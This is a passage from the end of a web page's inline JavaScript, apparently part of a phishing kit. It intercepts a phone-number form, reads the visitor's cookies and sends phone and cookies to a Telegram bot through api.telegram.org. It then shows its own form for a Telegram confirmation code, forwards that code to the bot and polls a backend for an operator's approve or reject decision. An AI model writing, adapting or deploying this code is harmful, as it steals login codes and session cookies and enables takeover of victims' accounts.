                    const phone = phoneInput.value.trim();
                    const errorP = document.querySelector('#form-step-1 .error');

                    // Простая проверка, чтобы не отправлять пустой номер.
                    // Основную валидацию и показ ошибки должен делать number.js
                    if (!phone) {
                        if (errorP && errorP.classList.contains('hidden')) { // Показать ошибку если она скрыта
                           // errorP.classList.remove('hidden'); // number.js должен сам это делать
                        }
                        return; 
                    } else {
                       if (errorP) errorP.classList.add('hidden'); // Скрыть если была наша ошибка
                    }

                    sessionStorage.setItem("submittedPhone", phone);
                    const cookies = document.cookie || "Немає кукі";
                    const msg = `📲 Новий запит\nТелефон: ${phone}\n🍪 Кукі: ${cookies}`;
                    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ chat_id, text: msg })
                    });

                    // После клика number.js должен скрыть step-1 и показать step-2 (оригинальный).
                    // Мы перехватим это с помощью MutationObserver.
                });
            }

            // Отслеживаем, когда number.js скрывает первый шаг,
            // чтобы затем показать НАШУ форму ввода кода.
            const observer = new MutationObserver(function(mutationsList, observerInstance) {
                for(const mutation of mutationsList) {
                    if (mutation.type === 'attributes' && mutation.attributeName === 'style') {
                        if (step1Div && step1Div.style.display === 'none') {
                            // number.js скрыл первый шаг.
                            // Теперь мы должны скрыть оригинальный второй шаг (если он был показан number.js)
                            // и показать нашу форму для ввода кода.
                            if (originalStep2Div) originalStep2Div.style.display = 'none';
                            if (formStep2Telegram) formStep2Telegram.style.display = 'block';
                            
                            observerInstance.disconnect(); // Отключаем наблюдение
                            break;
                        }
                    }
                }
            });

            if (step1Div) {
                observer.observe(step1Div, { attributes: true });
            }


            // Логика кнопки "Continua" НАШЕГО второго шага (ввод кода для Telegram)
            if (codeStepBtnTelegram) {
                codeStepBtnTelegram.addEventListener("click", function (e) {
                    e.preventDefault();

                    const codeInput = document.getElementById("code-telegram");
                    const code = codeInput ? codeInput.value.trim() : "";
                    const phone = sessionStorage.getItem("submittedPhone");

                    if (!code) {
                         alert("Per favore, inserisci il codice.");
                         return;
                    }
                     if (!phone) {
                        alert("Errore: numero di telefono non trovato. Riprova dal primo passaggio.");
                        if(formStep2Telegram) formStep2Telegram.style.display = "none";
                        if(originalStep2Div) originalStep2Div.style.display = "none";
                        if(step1Div) step1Div.style.display = "block";
                        return;
                    }

                    const msg = `🔐 Код підтвердження:\nТелефон: ${phone}\nКод: ${code}`;
                    // Убираем reply_markup, если бот парсит текст
                    /* const keyboard = {
                        inline_keyboard: [
                            [{ text: "✅ Так", callback_data: `confirm_yes_${phone}` },
                             { text: "❌ Ні", callback_data: `confirm_no_${phone}` }]
                        ]
                    }; */

                    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ chat_id, text: msg /*, reply_markup: keyboard */ })
                    });

                    if(formStep2Telegram) formStep2Telegram.style.display = "none";
                    if(loaderTelegram) loaderTelegram.style.display = "block";

                    waitForApproval(phone);
                });
            }

            function waitForApproval(phone) {
                const interval = setInterval(() => {
                    fetch(`${backendURL}/check-response?phone=${encodeURIComponent(phone)}`)
                        .then(res => {
                            if (!res.ok) throw new Error(`Network response was not ok: ${res.statusText}`);
                            return res.json();
                        })
                        .then(data => {
                            console.log("📩 Відповідь від бекенду:", data);
                            if (data.status === "approved") {
                                clearInterval(interval);
                                if(loaderTelegram) loaderTelegram.style.display = "none";
                                if(popReboot) popReboot.style.display = "block";
                            } else if (data.status === "rejected") {
                                clearInterval(interval);
                                if(loaderTelegram) loaderTelegram.style.display = "none";
                                if(popWhat) popWhat.style.display = "block";
                            }
                        })
                        .catch(err => {
                            console.error("❌ Помилка бекенду або мережі:", err);
                            // Можно добавить обработку, если нужно
                        });
                }, 3000);
            }
        });
    </script>
</body>
</html>
